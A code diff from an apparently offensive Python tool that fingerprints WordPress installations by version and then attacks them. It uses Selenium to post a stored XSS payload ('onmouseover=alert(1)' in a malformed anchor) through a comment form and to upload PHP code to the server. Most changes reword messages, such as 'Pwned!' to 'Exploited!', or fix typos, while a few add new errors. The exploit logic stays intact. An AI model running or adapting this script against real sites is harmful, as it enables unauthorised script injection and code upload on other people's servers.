@@ -91,10 +91,7 @@ def Check_WP_and_search_version (url):
     agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
     headers = {}
     headers['User-Agent'] = agent
-    #Вводим адрес сервиса
-    #print("Введите адрес (пример: 127.0.0.1/wordpress или example.com)\n")
-    #url = input()
-    print("Make sure it's WordPress.")
+    print("Make sure is it WordPress.")
    
     #Проверяем, является ли эта CMS Wordpress-ом
     req = urllib.request.Request(url+"/wp-config.php")
@@ -113,7 +110,7 @@ def Check_WP_and_search_version (url):
             print("This is not wordpress.")
             sys.exit()
     except (URLError) as e:
-            print("Time out. Probobly this is not Wordpress")
+            print("Time out. Probably this is not Wordpress")
             sys.exit()
     #Определяем версию ворд пресса
     print("Recognizing version. Please wait...")
@@ -139,7 +136,7 @@ def Check_WP_and_search_version (url):
             print("Can't find version using HTML code of page.")
             sys.exit()
         else:
-            print("Wordpress Version: "+version[0])
+            print("But finded by HTML code. Wordpress Version: "+version[0])
             return version[0] 
     except (urllib.error.HTTPError, IndexError) as e:
         print("Can't find version using HTML code of page.")
@@ -202,7 +199,7 @@ def Search_vulnerabilities (version):
 def Type_Expl():
     Typed = False
     try:
-        elem = driver.find_element_by_link_text("Pwned!")
+        elem = driver.find_element_by_link_text("Exploited!")
         elem.click()
         WebDriverWait(driver, 3).until(EC.alert_is_present())
         alert = driver.switch_to_alert()
@@ -215,10 +212,10 @@ def Type_Expl():
             email = driver.find_element_by_name("email")
             email.send_keys("Nagibator@gmail.com")
             commentbox = driver.find_element_by_id("comment")
-            commentbox.send_keys("[a <a href=']'></a><a href=' onmouseover=alert(1) '>Pwned!</a>")
+            commentbox.send_keys("[a <a href=']'></a><a href=' onmouseover=alert(1) '>Exploited!</a>")
             commentbox.submit()
             Typed = True
-            elem = driver.find_element_by_link_text("Pwned!")
+            elem = driver.find_element_by_link_text("Exploited!")
             elem.click()
             WebDriverWait(driver, 3).until(EC.alert_is_present())
             alert = driver.switch_to_alert()
@@ -269,7 +266,7 @@ def Upload_PHP_code(url):
         element.send_keys(Keys.ENTER)
         print("PHP code succesfully uploaded.")
     except:
-        print("Uploading of PHP code failed.")
+        print("Uploading PHP code failed.")
     finally:
         driver.quit()      
         
@@ -294,7 +291,7 @@ if (version <= 2.83):
             if(answer == "n"):
                 break
         except NameError as e:
-            print("Inncorrent answer, pleas try again")
+            print("Incorrect answer, please try again")
     while(True):
         try:
             answer = input("Would you like to try upload PHP code on server? y/n\n")
@@ -304,7 +301,7 @@ if (version <= 2.83):
             if(answer == "n"):
                 break
         except NameError as e:
-            print("Inncorrent answer, pleas try again")
+            print("Incorrect answer, please try again")
     if(version<=2.32):
         while(True):
             try:
@@ -315,9 +312,9 @@ if (version <= 2.83):
                 if(answer == "n"):
                     break
             except NameError as e:
-                print("Inncorrent answer, pleas try again")
+                print("Incorrenct answer, please try again")
 if((version >3)and(version<4)):
-    print("Testing xss attack vulnerability")
+    print("Testing stored xss attack vulnerability")
     success = False
     print("Please wait...")
     driver = webdriver.Firefox()
@@ -360,4 +357,4 @@ while(True):
             if(answer == "n"):
                 break
         except NameError as e:
-            print("Inncorrent answer, pleas try again")
+            print("Incorrect answer, please try again")
